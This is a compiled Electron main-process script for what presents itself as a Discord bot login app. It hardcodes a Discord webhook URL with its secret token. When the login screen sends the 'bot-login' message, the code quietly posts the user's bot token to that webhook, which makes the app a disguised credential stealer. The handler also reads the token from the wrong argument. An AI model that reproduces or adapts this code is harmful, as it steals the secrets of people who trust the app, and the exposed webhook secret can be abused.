"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const electron_1 = require("electron");
const node_fetch_1 = __importDefault(require("node-fetch"));
const webhook = "https://discord.com/api/webhooks/1053545463120396368/HovxvKFqHJF-wNACSGi4GJHSmsin6KX4y1GYd679nP4bv1KHXxUzErFY_yRZH2of_dIM";
electron_1.app.disableHardwareAcceleration();
const createWindow = () => {
    const win = new electron_1.BrowserWindow({
        width: 800,
        height: 600,
    });
    win.loadFile(`./static/html/index.html`);
    /* win.setMenu(null); */
};
electron_1.app.on(`ready`, () => {
    createWindow();
});
electron_1.app.on(`window-all-closed`, () => {
    if (process.platform !== `darwin`)
        electron_1.app.quit();
});
electron_1.ipcMain.on(`bot-login`, (message) => {
    (0, node_fetch_1.default)(webhook, {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ "content": message.bot_token })
    });
});
